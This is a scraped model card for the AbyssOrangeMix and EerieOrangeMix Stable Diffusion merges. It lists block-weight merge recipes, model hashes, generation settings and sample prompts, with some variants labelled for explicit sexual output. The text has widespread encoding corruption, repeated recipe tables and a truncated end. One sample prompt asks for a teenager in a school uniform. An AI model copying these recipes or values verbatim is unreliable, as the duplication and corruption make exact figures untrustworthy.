animefull-final-pruned[925997e9]„Äå89d59c3dde4c56c6d5c41da34cc55ce479d93b4007046980934b14db71bdb2a8„Äç\nNovelAI sfw[1d4a34af]„Äå22fa233c2dfd7748d534be603345cb9abf994a23244dfdfc1013f4f90322feca„Äç\nGape60[25396b85]„Äå893cca5903ccd0519876f58f4bc188dd8fcc5beb8a69c1a3f1a5fe314bb573f5„Äç\nBasilMix„Äåbbf07e3a1c3482c138d096f7dcdb4581a2aa573b74a68ba0906c7b657942f1c2„Äç\nchilloutmix_fp16.safetensors„Äå4b3bf0860b7f372481d0b6ac306fed43b0635caf8aa788e28b32377675ce7630„Äç\nCounterfeit-V2.5_fp16.safetensors„Äå71e703a0fca0e284dd9868bca3ce63c64084db1f0d68835f0a31e1f4e5b7cca6„Äç\nkenshi_01_fp16.safetensors„Äå3b3982f3aaeaa8af3639a19001067905e146179b6cddf2e3b34a474a0acae7fa„Äç\n‚ñºAOM3\n‚óÜInstructions:\n‚óÜInstructions:\nTool: SuperMerger\nUSE: https://github.com/hako-mikan/sd-webui-supermerger/Tool: SuperMerger\nUSE: https://github.com/hako-mikan/sd-webui-supermerger/\n(This extension is really great. It turns a month's work into an hour. Thank you)\nSTEP: 1 | BWM : NAI - NAIsfw & gape - NAI\nCUT: IN05-IN08, OUT10-11\nModel: A\nModel: B\nModel: C\nInterpolation Method\nWeight\nMerge Name\nAOM2sfw\nNAI full\nNAI sfw\nAdd Difference @ 1.0\n0,0.5,0.5,0.5,0.5,0.5,0,0,0,0,0.5,0.5,0.5,0.5,0.5,0.5,0.5,0.5,0.5,0.5,0.5,0.5,0.5,0.5,0,0\ntemp01\nModel: A\nModel: B\nModel: C\nInterpolation Method\nWeight\nMerge Name\n---\n---\n---\n---\n---\n---\nAOM2sfw\nNAI full\nNAI sfw\nAdd Difference @ 1.0\n0,0.5,0.5,0.5,0.5,0.5,0,0,0,0,0.5,0.5,0.5,0.5,0.5,0.5,0.5,0.5,0.5,0.5,0.5,0.5,0.5,0.5,0,0\ntemp01\nCUT: IN05-IN08, OUT10-11\nModel: A\nModel: B\nModel: C\nInterpolation Method\nWeight\nMerge Name\ntemp01\ngape60\nNAI full\nAdd Difference @ 1.0\n0,0.5,0.5,0.5,0.5,0.5,0,0,0,0,0.5,0.5,0.5,0.5,0.5,0.5,0.5,0.5,0.5,0.5,0.5,0.5,0.5,0.5,0,0\nAOM3\nModel: A\nModel: B\nModel: C\nInterpolation Method\nWeight\nMerge Name\n---\n---\n---\n---\n---\n---\ntemp01\ngape60\nNAI full\nAdd Difference @ 1.0\n0,0.5,0.5,0.5,0.5,0.5,0,0,0,0,0.5,0.5,0.5,0.5,0.5,0.5,0.5,0.5,0.5,0.5,0.5,0.5,0.5,0.5,0,0\nAOM3\n‚ñºAOM3A1\n‚óÜInstructions:\nTool: SuperMerger\n‚óÜInstructions:\nTool: SuperMerger\nSTEP: 1 | Change the base photorealistic model of AOM3 from BasilMix to Chilloutmix.\nChange the photorealistic model from BasilMix to Chilloutmix and proceed to gapeNAI merge.\nSTEP: 2 |\nStep\nInterpolation Method\nPrimary Model\nSecondary Model\nTertiary Model\nMerge Name\n1\nSUM @ 0.5\nCounterfeit2.5\nKenshi\nCounterfeit+Kenshi\nStep\nInterpolation Method\nPrimary Model\nSecondary Model\nTertiary Model\nMerge Name\n---\n---\n---\n---\n---\n---\n1\nSUM @ 0.5\nCounterfeit2.5\nKenshi\nCounterfeit+Kenshi\nSTEP: 3 |\nCUT: BASE0, IN00-IN08Ôºö0, IN10Ôºö0.1, OUT03-04-05Ôºö0, OUT08Ôºö0.2\nModel: A\nModel: B\nModel: C\nInterpolation Method\nWeight\nMerge Name\nAOM3\nCounterfeit+Kenshi\nAdd SUM @ 1.0\n0,0,0,0,0,0,0,0,0,0.3,0.1,0.3,0.3,0.3,0.2,0.1,0,0,0,0.3,0.3,0.2,0.3,0.4,0.5\nAOM3A1\n‚ñºAOM3A1\n‚õîOnly this model (AOM3A1) includes ChilloutMix (=The curse of DreamLike).Commercial use is not available.\nModel: A\nModel: B\nModel: C\nInterpolation Method\nWeight\nMerge Name\nAOM3\nCounterfeit+Kenshi\nAdd SUM @ 1.0\n0,0,0,0,0,0,0,0,0,0.3,0.1,0.3,0.3,0.3,0.2,0.1,0,0,0,0.3,0.3,0.2,0.3,0.4,0.5\nAOM3A1\n‚ñºAOM3A1\n‚õîOnly this model (AOM3A1) includes ChilloutMix (=The curse of DreamLike).Commercial use is not available.\n‚ñºAOM3A2\n‚óÜ?\n‚óÜ?\nCUT: BASE0, IN05:0.3„ÄÅIN06-IN08Ôºö0, IN10Ôºö0.1, OUT03Ôºö0, OUT04Ôºö0.3, OUT05Ôºö0, OUT08Ôºö0.2\n‚óÜInstructions:\n‚óÜInstructions:\nTool: SuperMerger\nTool: SuperMerger\nModel: A\nModel: B\nModel: C\nInterpolation Method\nWeight\nMerge Name\nAOM3\nCounterfeit2.5\nnai\nAdd Difference @ 1.0\n0,1,1,1,1,1,0.3,0,0,0,1,0.1,1,1,1,1,1,0,1,0,1,1,0.2,1,1,1\nAOM3A2\nModel: A\nModel: B\nModel: C\nInterpolation Method\nWeight\nMerge Name\n---\n---\n---\n---\n---\n---\nAOM3\nCounterfeit2.5\nnai\nAdd Difference @ 1.0\n0,1,1,1,1,1,0.3,0,0,0,1,0.1,1,1,1,1,1,0,1,0,1,1,0.2,1,1,1\nAOM3A2\n‚óÜAOM3A3\n‚óÜAOM3A3\nCUT : BASE0, IN05-IN08Ôºö0, IN10Ôºö0.1, OUT03Ôºö0.5, OUT04-05Ôºö0.1, OUT08Ôºö0.2\nTool: SuperMerger\nModel: A\nModel: B\nModel: C\nInterpolation Method\nWeight\nMerge Name\nAOM3\nCounterfeit2.5\nnai\nAdd Difference @ 1.0\n0,0.6,0.6,0.6,0.6,0.6,0,0,0,0,0.6,0.1,0.6,0.6,0.6,0.6,0.6,0.5,0.1,0.1,0.6,0.6,0.2,0.6,0.6,0.6\nAOM3A3\n‚ñºAOM3A1B\n‚óÜInstructions:\nTool: SuperMerge\nModel: A\nModel: B\nModel: C\nInterpolation Method\nWeight\nMerge Name\nAOM3\nCounterfeit2.5\nAdd Sum @ 1.0\n0,1,1,1,1,1,0.3,0,0,0,1,0.1,1,1,1,1,1,0,1,0,1,1,0.2,1,1,1\nAOM3A1B\n‚ñºAOM3B2\n‚óÜInstructions:\nTool: Checkpoint Merger\nModel: A\nModel: B\nModel: C\nInterpolation Method\nWeight\nMerge Name\nAOM3A1B\nBreakdomain m21_fp16\nAdd Sum\n0.4\nAOM3B2\nTool: SuperMerger\nModel: A\nModel: B\nModel: C\nInterpolation Method\nWeight\nMerge Name\nAOM3\nCounterfeit2.5\nnai\nAdd Difference @ 1.0\n0,0.6,0.6,0.6,0.6,0.6,0,0,0,0,0.6,0.1,0.6,0.6,0.6,0.6,0.6,0.5,0.1,0.1,0.6,0.6,0.2,0.6,0.6,0.6\nAOM3A3\n‚ñºAOM3A1B\n‚óÜInstructions:\nTool: SuperMerge\nModel: A\nModel: B\nModel: C\nInterpolation Method\nWeight\nMerge Name\nAOM3\nCounterfeit2.5\nAdd Sum @ 1.0\n0,1,1,1,1,1,0.3,0,0,0,1,0.1,1,1,1,1,1,0,1,0,1,1,0.2,1,1,1\nAOM3A1B\n‚ñºAOM3B2\n‚óÜInstructions:\nTool: Checkpoint Merger\nModel: A\nModel: B\nModel: C\nInterpolation Method\nWeight\nMerge Name\nAOM3A1B\nBreakdomain m21_fp16\nAdd Sum\n0.4\nAOM3B2\nAbyssOrangeMix2 (AOM2)\n‚Äï‚ÄïCreating the next generation of illustration with ‚ÄúAbyss‚Äù!\nPrompt: https://majinai.art/ja/i/nxpKRpw\n‚ñºAbout\nAbyssOrangeMix2 (AOM2) is an AI model capable of generating high-quality, highly realistic illustrations.\nIt can generate elaborate and detailed illustrations that cannot be drawn by hand. It can also be used for a variety of purposes, making it extremely useful for design and artwork.\nFurthermore, it provides an unparalleled new means of expression.\nIt can generate illustrations in a variety of genres to meet a wide range of needs. I encourage you to use \"Abyss\" to make your designs and artwork richer and of higher quality.\n‚Äªnvidia joke.\n‚ñºDescription for engineers/enthusiasts\nThe merged model was formulated using an extension such as sdweb-merge-block-weighted-gui, which merges models at separate rates for each of the 25 U-Net blocks (input, intermediate, and output).\nThe validation of many Anons has shown that such a recipe can generate a painting style that is anatomically realistic enough to feel the finger skeleton, but still maintains an anime-style face.\nThe changes from AbyssOrangeMix are as follows.\nthe model used for U-Net Blocks Weight Merge was changed from Instagram+F222 to BasilMix. (https://huggingface.co/nuigurumi)\nThis is an excellent merge model that can generate decent human bodies while maintaining the facial layers of the Instagram model. Thanks!!!\nThis has improved the dullness of the color and given a more Japanese skin tone (or more precisely, the moisturized white skin that the Japanese would ideally like).\nAlso, the unnatural bokeh that sometimes occurred in the previous version may have been eliminated (needs to be verified).\n2.Added IN deep layers (IN06-11) to the layer merging from the realistic model (BasilMix).\nIt is said that the IN deep layer (IN06-11) is the layer that determines composition, etc., but perhaps light, reflections, skin texture, etc., may also be involved.\nIt is like \"Global Illumination\", \"Ray tracing\" and \"Ambient Occlusion\" in 3DCG.\n‚ÄªThis does not fundamentally improve the fingers. Therefore, More research needs to be done to improve the fingers (e.g. 'bad_prompt').\nAbout 30-50% chance of generating correct fingers(?). Abyss is deep.\n‚ñºSample Gallery\nThe prompts for generating these images were all generated using ChatGPT. I simply asked \"Pirates sailing the oceans\" to tell me what the prompts were.However, to make sure the AI understood the specifications, I used the template for AI questions (Question template for AI prompt generation(v1.2) ).\nPlease review the following.\nhttps://seesaawiki.jp/nai_ch/d/AI%a4%f2%b3%e8%cd%d1%a4%b7%a4%bf%a5%d7%a5%ed%a5%f3%a5%d7%a5%c8%c0%b8%c0%ae\nThe images thus generated, strangely enough, look like MidJourney or Nijijourney illustrations. Perhaps they are passing user prompts through GPT or something else before passing them on to the image AIü§î\n‚ñºREAD MOREüñº\n‚ñºAll prompts to generate sample images\nGaming Girl\nFantasy\nRainy Day\nKemomimi Girl\nSupermarket\nLunch Time\nWomens in the Garden\nPirate\nJapanese Girl\nSweets Time\nGlasses Girl\n‚ñºHow to use\nVAE: orangemix.vae.pt\nPrompts can be long or shortAs simple as possible is good. Do not add excessive detail prompts. Start with just this negative propmt.(worst quality, low quality:1.4)\nSampler: ‚ÄúDPM++ SDE Karras‚Äù is good\nSteps: forTest: 12ÔΩû ,illustration: 20ÔΩû\nClipskip: 1 or 2\nUpscaler : Latenet (nearest-exact)\nCFG Scale : 5 or 6 (4ÔΩû8)\nDenoise strength: 0.5 (0.45~0.6)If you use 0.7ÔΩû, the picture will change too much.If below 0.45, Block noise occurs.\nüóíModel List\nAbyssOrangeMix2_sfwÔΩúBasilMix U-Net Blocks Weight Merge\nAbyssOrangeMix2_nsfwÔΩú+ NAI-NAISFW 0.3 Merge\nAbyssOrangeMix2_hardÔΩú+ Gape 0.3 Merge\n‚ÄªChanged suffix of models._base ‚Üí_sfw: _base was changed to_sfw.\n_night ‚Üí_nsfw: Merged models up to NAI-NAI SFW were changed from _night to_nsfw.\n_half and non suffix ‚Üí_hard: Gape merged models were given the suffix _hard.gape was reduced to 0.3 because it affects character modeling.\n‚ñºHow to choice models\n_sfw : SFWüòâ\n_nsfw : SFW ÔΩû Soft NSFWü•∞\n_hard : SFW ÔΩû hard NSFWüëÑ\n‚ñºHash\nAbyssOrangeMix2_sfw.ckpt„Äåf75b19923f2a4a0e70f564476178eedd94e76e2c94f8fd8f80c548742b5b51b9„Äç\nAbyssOrangeMix2_sfw.safetensors„Äå038ba203d8ba3c8af24f14e01fbb870c85bbb8d4b6d9520804828f4193d12ce9„Äç\nAbyssOrangeMix2_nsfw.safetensors„Äå0873291ac5419eaa7a18726e8841ce0f15f701ace29e0183c47efad2018900a4„Äç\nAbyssOrangeMix_hard.safetensors„Äå0fc198c4908e98d7aae2a76bd78fa004e9c21cb0be7582e36008b4941169f18e„Äç\n‚ñºUse Models\nAnythingV3.0 huggingface pruned[2700c435]„Äå543bcbc21294831c6245cd74c8a7707761e28812c690f946cb81fef930d54b5e„Äç\nNovelAI animefull-final-pruned[925997e9]„Äå89d59c3dde4c56c6d5c41da34cc55ce479d93b4007046980934b14db71bdb2a8„Äç\nNovelAI sfw[1d4a34af]„Äå22fa233c2dfd7748d534be603345cb9abf994a23244dfdfc1013f4f90322feca„Äç\nGape60[25396b85]„Äå893cca5903ccd0519876f58f4bc188dd8fcc5beb8a69c1a3f1a5fe314bb573f5„Äç\nBasilMix„Äåbbf07e3a1c3482c138d096f7dcdb4581a2aa573b74a68ba0906c7b657942f1c2„Äç\nAbyssOrangeMix2_sfw (AOM2s)\n‚ñºInstructions:\nSTEP: 1ÔΩúBlock Merge\nModel: A\nModel: B\nWeight\nBase alpha\nMerge Name\nAnythingV3.0\nBasilMix\n1,0.9,0.7,0.5,0.3,0.1,1,1,1,1,1,1,0,0,0,0,0,0,0,0.1,0.3,0.5,0.7,0.9,1\n0\nAbyssOrangeMix2_sfw\nAbyssOrangeMix2_nsfw (AOM2n)\n‚ñº?\nJUST AbyssOrangeMix2_sfw+ (NAI-NAISFW) 0.3.\n‚ñºInstructions:\nStep\nInterpolation Method\nPrimary Model\nSecondary Model\nTertiary Model\nMerge Name\n1\nAdd Difference @ 0.3\nAbyssOrangeMix_base\nNovelAI animefull\nNovelAI sfw\nAbyssOrangeMix2_nsfw\nAbyssOrangeMix2_hard (AOM2h)\n‚ñº?\n+Gape0.3 version AbyssOrangeMix2_nsfw.\n‚ñºInstructions\nStep\nInterpolation Method\nPrimary Model\nSecondary Model\nTertiary Model\nMerge Name\n1\nAdd Difference @ 0.3\nAbyssOrangeMix2_nsfw\nGape60\nNovelAI animefull\nAbyssOrangeMix2_hard\nEerieOrangeMix (EOM)\nEerieOrangeMix is the generic name for a U-Net Blocks Weight Merge Models based on Elysium(Anime V2).Since there are infinite possibilities for U-Net Blocks Weight Merging, I plan to treat all Elysium-based models as a lineage of this model.\n‚ÄªThis does not fundamentally improve the fingers. Therefore, More research needs to be done to improve the fingers (e.g. 'bad_prompt').\nEerieOrangeMix (EOM1)\n‚ñº?\nThis merge model is simply a U-Net Blocks Weight Merge of ElysiumAnime V2 with the AbyssOrangeMix method.\nThe AnythingModel is good at cute girls anyway, and no matter how hard I try, it doesn't seem to be good at women in their late 20s and beyond. Therefore, I created a U-Net Blocks Weight Merge model based on my personal favorite ElysiumAnime V2 model. ElyOrangeMix was originally my favorite, so this is an enhanced version of that.\nüóíModel List\nEerieOrangeMix_baseÔΩúInstagram+F222 U-Net Blocks Weight Merge\nEerieOrangeMix_nightÔΩú+ NAI-NAISFW Merge\nEerieOrangeMix_halfÔΩú+ Gape0.5 Merge\nEerieOrangeMixÔΩú+ Gape1.0 Merge\n‚ñº How to choice models\n_base : SFWüòâ\n_Night : SFW ÔΩû Soft NSFWü•∞\n_half : SFW ÔΩû NSFWüëÑ\nunlabeled : SFW ÔΩû HARDCORE ÔΩûü§Ø  ex)AbyssOrangeMix, BloodOrangeMix...etc\n‚ñºHash\nEerieOrangeMix.safetensors\nEerieOrangeMix_half.safetensors\nEerieOrangeMix_night.safetensors\nEerieOrangeMix_base.ckpt\n‚ñºUse Models\n[] = WebUI Hash,„Äå„Äç= SHA256\nElysium Anime V2\n[]„Äå5c4787ce1386500ee05dbb9d27c17273c7a78493535f2603321f40f6e0796851„Äç\nNovelAI animefull-final-pruned\n[925997e9]„Äå89d59c3dde4c56c6d5c41da34cc55ce479d93b4007046980934b14db71bdb2a8„Äç\nNovelAI sfw\n[1d4a34af]„Äå22fa233c2dfd7748d534be603345cb9abf994a23244dfdfc1013f4f90322feca„Äç\nGape60\n[25396b85]„Äå893cca5903ccd0519876f58f4bc188dd8fcc5beb8a69c1a3f1a5fe314bb573f5„Äç\ninstagram-latest-plus-clip-v6e1_50000.safetensors\n[] „Äå8f1d325b194570754c6bd06cf1e90aa9219a7e732eb3d488fb52157e9451a2a5„Äç\nf222\n[] „Äå9e2c6ceff3f6d6f65c6fb0e10d8e69d772871813be647fd2ea5d06e00db33c1f„Äç\nsd1.5_pruned\n[] „Äåe1441589a6f3c5a53f5f54d0975a18a7feb7cdf0b0dee276dfc3331ae376a053„Äç\n‚ñº Sample Gallery\nMoreüñº\n‚ñº How to use\nVAE: orangemix.vae.pt\nAs simple as possible is good. Do not add excessive detail prompts. Start with just this.\n(worst quality, low quality:1.4)\nSampler: ‚ÄúDPM++ SDE Karras‚Äù is good\nSteps: forTest: 20ÔΩû24 ,illustration: 24ÔΩû50\nClipskip: 1\nUSE ‚Äúupscale latent space‚Äù\nDenoise strength: 0.45 (0.4~0.5)If you use 0.7ÔΩû, the picture will change too much.\n‚ñºPrompts\nüñåWhen generating cute girls, try this negative prompt first. It avoids low quality, prevents blurring, avoids dull colors, and dictates Anime-like cute face modeling.\nnsfw, (worst quality, low quality:1.3), (depth of field, blurry:1.2), (greyscale, monochrome:1.1), 3D face, nose, cropped, lowres, text, jpeg artifacts, signature, watermark, username, blurry, artist name, trademark, watermark, title, (tan, muscular, loli, petite, child, infant, toddlers, chibi, sd character:1.1), multiple view, Reference sheet,\nEerieOrangeMix_base (EOM1b)\n‚ñº?Details are omitted since it is the same as AbyssOrangeMix.\n‚ñºInstructions:\nSTEP: 1ÔΩúCreation of photorealistic model for Merge\nStep\nInterpolation Method\nPrimary Model\nSecondary Model\nTertiary Model\nMerge Name\n1\nAdd Difference @ 1.0\ninstagram-latest-plus-clip-v6e1_50000\nf222\nsd1.5_pruned\nInsta_F222\nSTEP: 2ÔΩúBlock Merge\nMerge InstaF222\nModel: A\nModel: B\nWeight\nBase alpha\nMerge Name\nElysium Anime V2\nInsta_F222\n1,0.9,0.7,0.5,0.3,0.1,0,0,0,0,0,0,0,0,0,0,0,0,0,0.1,0.3,0.5,0.7,0.9,1\n0\nTemp1\nEerieOrangeMix_Night (EOM1n)\n‚ñº?\nJUST EerieOrangeMix_base+ (NAI-NAISFW) 0.3.\n‚ñºInstructions\nStep\nInterpolation Method\nPrimary Model\nSecondary Model\nTertiary Model\nMerge Name\n1\nAdd Difference @ 0.3\nEerieOrangeMix_base\nNovelAI animefull\nNovelAI sfw\nEerieOrangeMix_Night\nEerieOrangeMix_half (EOM1h)\n‚ñº?\n+Gape0.5 version EerieOrangeMix.\n‚ñºInstructions:\nStep\nInterpolation Method\nPrimary Model\nSecondary Model\nTertiary Model\nMerge Name\n1\nAdd Difference @ 0.5\nEerieOrangeMix_Night\nNovelAI animefull\nNovelAI sfw\nEerieOrangeMix_half\nEerieOrangeMix (EOM1)\n‚ñºInstructions:\nStep\nInterpolation Method\nPrimary Model\nSecondary Model\nTertiary Model\nMerge Name\n1\nAdd Difference @ 1.0\nEerieOrangeMix_Night\nGape60\nNovelAI animefull\nEerieOrangeMix\nEerieOrangeMix2 (EOM2)\n‚ñº?\nThe model was created by adding the hierarchy responsible for detailing and painting ElysiumV1 to EerieOrangeMix_base, then merging NAI and Gape.\nüóíModel List\nEerieOrangeMix2_baseÔΩúInstagram+F222+ElysiumV1 U-Net Blocks Weight Merge\nEerieOrangeMix2_nightÔΩú+ NAI-NAISFW Merge\nEerieOrangeMix2_halfÔΩú+ Gape0.5 Merge\nEerieOrangeMix2ÔΩú+ Gape1.0 Merge\n‚ñº How to choice models\n_base : SFWüòâ\n_Night : SFW ÔΩû Soft NSFWü•∞\n_half : SFW ÔΩû NSFWüëÑ\nunlabeled : SFW ÔΩû HARDCORE ÔΩûü§Ø  ex)AbyssOrangeMix, BloodOrangeMix...etc\n‚ñºHash\nEerieOrangeMix2.safetensors\nEerieOrangeMix2_half.safetensors\nEerieOrangeMix2_night.safetensors\nEerieOrangeMix2_base.ckpt\n‚ñºUse Models\n[] = webuHash,„Äå„Äç= SHA256\nElysium Anime V2\n[]„Äå5c4787ce1386500ee05dbb9d27c17273c7a78493535f2603321f40f6e0796851„Äç\nNovelAI animefull-final-pruned\n[925997e9]„Äå89d59c3dde4c56c6d5c41da34cc55ce479d93b4007046980934b14db71bdb2a8„Äç\nNovelAI sfw\n[1d4a34af]„Äå22fa233c2dfd7748d534be603345cb9abf994a23244dfdfc1013f4f90322feca„Äç\nGape60\n[25396b85]„Äå893cca5903ccd0519876f58f4bc188dd8fcc5beb8a69c1a3f1a5fe314bb573f5„Äç\ninstagram-latest-plus-clip-v6e1_50000.safetensors\n[] „Äå8f1d325b194570754c6bd06cf1e90aa9219a7e732eb3d488fb52157e9451a2a5„Äç\nf222\n[] „Äå9e2c6ceff3f6d6f65c6fb0e10d8e69d772871813be647fd2ea5d06e00db33c1f„Äç\nsd1.5_pruned\n[] „Äåe1441589a6f3c5a53f5f54d0975a18a7feb7cdf0b0dee276dfc3331ae376a053„Äç\nElysiumV1\n„Äåabbb28cb5e70d3e0a635f241b8d61cefe42eb8f1be91fd1168bc3e52b0f09ae4„Äç\nEerieOrangeMix2_base (EOM2b)\n‚ñº?\n‚ñºInstructions\nSTEP: 1ÔΩúBlock Merge\nMerge ElysiumV1\nThe generated results do not change much with or without this process, but I wanted to incorporate Elysium's depiction, so I merged it.\nModel: A\nModel: B\nWeight\nBase alpha\nMerge Name\nEerieOrangeMix_base\nElysiumV1\n1,0.9,0.7,0.5,0.3,0.1,0,0,0,0,0,0,0,0,0,0,0,0,0,0.1,0.3,0.5,0.7,0.9,1\n0\nEerieOrangeMix2_base\nEerieOrangeMix2_night (EOM2n)\n‚ñº?\nJUST EerieOrangeMix2_base+ (NAI-NAISFW) 0.3.\n‚ñºInstructions\nStep\nInterpolation Method\nPrimary Model\nSecondary Model\nTertiary Model\nMerge Name\n1\nAdd Difference @ 0.3\nEerieOrangeMix_base\nNovelAI animefull\nNovelAI sfw\nEerieOrangeMix2_Night\nEerieOrangeMix2_half (EOM2h)\n‚ñº?\n+Gape0.5 version EerieOrangeMix2.\n‚ñºInstructions\nStep\nInterpolation Method\nPrimary Model\nSecondary Model\nTertiary Model\nMerge Name\n1\nAdd Difference @ 0.5\nEerieOrangeMix_Night\nNovelAI animefull\nNovelAI sfw\nEerieOrangeMix2_half\nEerieOrangeMix2 (EOM2)\n‚ñºInstructions:\nStep\nInterpolation Method\nPrimary Model\nSecondary Model\nTertiary Model\nMerge Name\n1\nAdd Difference @ 1.0\nEerieOrangeMix_Night\nGape60\nNovelAI animefull\nEerieOrangeMix2\nModels Comparison\n‚ÄªThe difference is slight but probably looks like this.\n‚Üê warm color, ‚Üë natural color, ‚Üí animated color\nAbyssOrangeMix (AOM)\n‚Äï‚ÄïHow can you guys take on such a deep swamp and get results?Is it something like \"Made in Abyss\"?By Anon, 115th thread\n‚ñº?\nThe merged model was formulated using an extension such as sdweb-merge-block-weighted-gui, which merges models at separate rates for each of the 25 U-Net blocks (input, intermediate, and output).\nThe validation of many Anons has shown that such a recipe can generate a painting style that is anatomically realistic enough to feel the finger skeleton, but still maintains an anime-style face.\n‚ÄªThis model is the result of a great deal of testing and experimentation by many Anonsü§ó\n‚ÄªThis model can be very difficult to handle. I am not 100% confident in my ability to use this model. It is peaky and for experts.‚ÄªThis does not fundamentally improve the fingers, and I recommend using bad_prompt, etc. (Embedding) in combination.\n‚ñºSample Gallery\n(1)\n((masterpiece)), best quality, perfect anatomy, (1girl, solo focus:1.4), pov, looking at viewer, flower trim,(perspective, sideway, From directly above ,lying on water, open hand, palm, :1.3),(Accurate five-fingered hands, Reach out, hand focus, foot focus, Sole, heel, ball of the thumb:1.2), (outdoor, sunlight:1.2),(shiny skin:1.3),,(masterpiece, white border, outside border, frame:1.3),\n, (motherhood, aged up, mature female, medium breasts:1.2), (curvy:1.1), (single side braid:1.2), (long hair with queue and braid, disheveled hair, hair scrunchie, tareme:1.2), (light Ivory hair:1.2), looking at viewer,, Calm, Slight smile,\n,(anemic, dark, lake, river,puddle, Meadow, rock, stone, moss, cliff, white flower, stalactite, Godray, ruins, ancient, eternal, deep ,mystic background,sunlight,plant,lily,white flowers, Abyss, :1.2), (orange fruits, citrus fruit, citrus fruit bearing tree:1.4), volumetric lighting,good lighting,, masterpiece, best quality, highly detailed,extremely detailed cg unity 8k wallpaper,illustration,((beautiful detailed face)), best quality, (((hyper-detailed ))), high resolution illustration ,high quality, highres, sidelighting, ((illustrationbest)),highres,illustration, absurdres, hyper-detailed, intricate detail, perfect, high detailed eyes,perfect lighting, (extremely detailed CG:1.2),\nNegative prompt: (bad_prompt_version2:1), distant view, lip, Pregnant, maternity, pointy ears, realistic, tan, muscular, greyscale, monochrome, lineart, 2koma, 3koma, 4koma, manga, 3D, 3Dcubism, pablo picasso, disney, marvel, mutanted breasts, mutanted nipple, cropped, lowres, bad anatomy, bad hands, text, error, missing fingers, extra digit, fewer digits, cropped, worst quality, low quality, normal quality, jpeg artifacts, signature, watermark, username, blurry, artist name, lowres, trademark, watermark, title, text, deformed, bad anatomy, disfigured, mutated, extra limbs, ugly, missing limb, floating limbs, disconnected limbs, out of frame, mutated hands and fingers, poorly drawn hands, malformed hands, poorly drawn face, poorly drawn asymmetrical eyes, (blurry:1.4), duplicate (loli, petite, child, infant, toddlers, chibi, sd character, teen age:1.4), tsurime, helmet hair, evil smile, smug_face, naughty smile, multiple view, Reference sheet, (worst quality, low quality:1.4),\nSteps: 24, Sampler: DPM++ SDE Karras, CFG scale: 10, Seed: 1159970659, Size: 1536x768, Model hash: cc44dbff, Model: AbyssOrangeMix, Variation seed: 93902374, Variation seed strength: 0.45, Denoising strength: 0.45, ENSD: 31337\n(2)\nstreet, 130mm f1.4 lens, ,(shiny skin:1.3),, (teen age, school uniform:1.2), (glasses, black hair, medium hair with queue and braid, disheveled hair, hair scrunchie, tareme:1.2), looking at viewer,, Calm, Slight smile,\nNegative prompt: (bad_prompt_version2:1), distant view, lip, Pregnant, maternity, pointy ears, realistic, tan, muscular, greyscale, monochrome, lineart, 2koma, 3koma, 4koma, manga, 3D, 3Dcubism, pablo picasso, disney, marvel, mutanted breasts, mutanted nipple, cropped, lowres, bad anatomy, bad hands, text, error, missing fingers, extra digit, fewer digits, cropped, worst quality, low quality, normal quality, jpeg artifacts, signature, watermark, username, blurry, artist name, lowres, trademark, watermark, title, text, deformed, bad anatomy, disfigured, mutated, extra limbs, ugly, missing limb, floating limbs, disconnected limbs, out of frame, mutated hands and fingers, poorly drawn hands, malformed hands, poorly drawn face, poorly drawn asymmetrical eyes, (blurry:1.4), duplicate (loli, petite, child, infant, toddlers, chibi, sd character, teen age:1.4), tsurime, helmet hair, evil smile, smug_face, naughty smile, multiple view, Reference sheet, (worst quality, low quality:1.4),\nSteps: 24, Sampler: DPM++ SDE Karras, CFG scale: 10, Seed: 1140782193, Size: 1024x1536, Model hash: cc44dbff, Model: AbyssOrangeMix, Denoising strength: 0.45, ENSD: 31337, First pass size: 512x768, Model sha256: 6bb3a5a3b1eadd32, VAE sha256: f921fb3f29891d2a, Options: xformers medvram gtx_16x0\nUsed embeddings: bad_prompt_version2 [afea]\n‚ñºHow to use\nVAE: orangemix.vae.pt\nPrompts can be long or shortAs simple as possible is good. Do not add excessive detail prompts. Start with just this.\n(worst quality, low quality:1.4)\nSampler: ‚ÄúDPM++ SDE Karras‚Äù is good\nSteps: forTest: 20ÔΩû24 ,illustration: 24ÔΩû50\nClipskip: 1\nUSE ‚Äúupscale latent space‚Äù\nDenoise strength: 0.45 (0.4~0.5)\nIf you use 0.7ÔΩû, the picture will change too much.\n‚ñºPrompts\nüñåWhen generating cute girls, try this negative prompt first. It avoids low quality, prevents blurring, avoids dull colors, and dictates Anime-like cute face modeling.\nnsfw, (worst quality, low quality:1.3), (depth of field, blurry:1.2), (greyscale, monochrome:1.1), 3D face, nose, cropped, lowres, text, jpeg artifacts, signature, watermark, username, blurry, artist name, trademark, watermark, title, (tan, muscular, loli, petite, child, infant, toddlers, chibi, sd character:1.1), multiple view, Reference sheet,\nüóíModel List\nAbyssOrangeMix_baseÔΩúInstagram Merge\nAbyssOrangeMix_NightÔΩú+ NAI-NAISFW Merge\nAbyssOrangeMix_halfÔΩú+ Gape0.5 Merge\nAbyssOrangeMixÔΩú+ Gape1.0 Merge\n‚ñº How to choice models\n_base : SFWüòâ\n_Night : SFW ÔΩû Soft NSFWü•∞\n_half : SFW ÔΩû NSFWüëÑ\nunlabeled : SFW ÔΩû HARDCORE ÔΩûü§Ø  ex)AbyssOrangeMix, BloodOrangeMix...etc\n‚ñºHash (SHA256)\nAbyssOrangeMix.safetensors6bb3a5a3b1eadd32dfbc8f0987559c48cb4177aee7582baa6d6a25181929b345\nAbyssOrangeMix_half.safetensors468d1b5038c4fbd354113842e606fe0557b4e0e16cbaca67706b29bcf51dc402\nAbyssOrangeMix_Night.safetensors167cd104699dd98df22f4dfd3c7a2c7171df550852181e454e71e5bff61d56a6\nAbyssOrangeMix_base.ckptbbd2621f3ec4fad707f75fc032a2c2602c296180a53ed3d9897d8ca7a01dd6ed\n‚ñºUse Models\nAnythingV3.0 huggingface pruned\n[2700c435]„Äå543bcbc21294831c6245cd74c8a7707761e28812c690f946cb81fef930d54b5e„Äç\nNovelAI animefull-final-pruned\n[925997e9]„Äå89d59c3dde4c56c6d5c41da34cc55ce479d93b4007046980934b14db71bdb2a8„Äç\nNovelAI sfw\n[1d4a34af]„Äå22fa233c2dfd7748d534be603345cb9abf994a23244dfdfc1013f4f90322feca„Äç\nGape60\n[25396b85]„Äå893cca5903ccd0519876f58f4bc188dd8fcc5beb8a69c1a3f1a5fe314bb573f5„Äç\ninstagram-latest-plus-clip-v6e1_50000.safetensors\n[] „Äå8f1d325b194570754c6bd06cf1e90aa9219a7e732eb3d488fb52157e9451a2a5„Äç\nf222\n[] 